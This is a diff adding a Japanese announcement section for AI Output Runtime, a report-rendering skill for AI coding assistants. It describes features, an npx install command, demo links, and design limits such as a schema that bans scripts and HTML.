+## コードブロックハイライトも内蔵、30 言語
+
+6 言語インライン（json / bash / js+ts / python / yaml / diff）+ 24 言語遅延ロード
+（go / rust / php / ruby / java / kotlin / swift / c / cpp / csharp / sql / html /
+css / xml / dockerfile / toml / ini / lua / perl / r / scala / dart / regex /
+graphql）。ランタイム本体は 28 KB gzipped のまま。
+
+## Reader UX（v0.4.x で重要だった追加）
+
+- **自動エグゼクティブサマリーカード**：最初の callout と最初の trend-card を
+  抽出して、レポート先頭に 10 秒で読める折りたたみカードを挿入
+- **Locale 対応の数値フォーマット**：`Intl.NumberFormat` で千区切り / 通貨 /
+  パーセンテージを自動切り替え（zh-CN / en / ja）
+- **Sticky TOC + アクティブセクション強調**：1200px 以上の画面で右側に固定
+- **印刷時の表紙ページ**：`@page` A4 + report-header が表紙化、H1 ごとに改ページ
+- **CSV エクスポート**：全てのデータコンポーネントに ⤓ ボタン
+
+## Claude Code / Codex / Cursor へのインストール
+
+```bash
+npx skills add wxkingstar/ai-output-runtime -g -y
+```
+
+インストール後、「週報を書いて」「Q1 OKR 振り返り」「営業ファネルを作って」
+などの自然な依頼で自動的にスキルが起動します。
+
+## ライブデモ
+
+このデモページ自体が AIO ドキュメントです（上部の「View source」をクリックすると
+生成元の Markdown が見えます）：
+
+https://wxkingstar.github.io/ai-output-runtime/
+
+業務レポートのフルデモ：
+
+- 週報: https://wxkingstar.github.io/ai-output-runtime/demo-weekly.html
+- Q1 ダッシュボード: https://wxkingstar.github.io/ai-output-runtime/demo-dashboard.html
+
+## 意図的にやらないこと
+
+- **可視化を再発明しない**：line / bar / area / pie / donut + 5 つのビジネス
+  チャートのみ。複雑なものは ECharts / D3 に任せる。AIO は「5 分で見せられる
+  レポートを出す」線に留まります。
+- **リッチテキスト HTML を描画しない**：フィールドは plain text + 限定的な
+  Markdown インラインのみ。HTML タグは全て拒否。
+- **プロンプト注入経路を一切残さない**：style / script / event handler /
+  template expression / custom component すべてスキーマで禁止。
+
+## リポジトリ
+
+GitHub (MIT): https://github.com/wxkingstar/ai-output-runtime
+skills.sh listing: https://skills.sh/wxkingstar/ai-output-runtime
+
+フィードバック歓迎：
+
+- 業務レポートで 15 コンポーネントでカバーできない形は？
+- スキル発動時に直感に反する挙動があれば
+- Claude で本番レポートを書いている方の最大の痛点
+
+issues でお待ちしています。
 ```
 
 ---
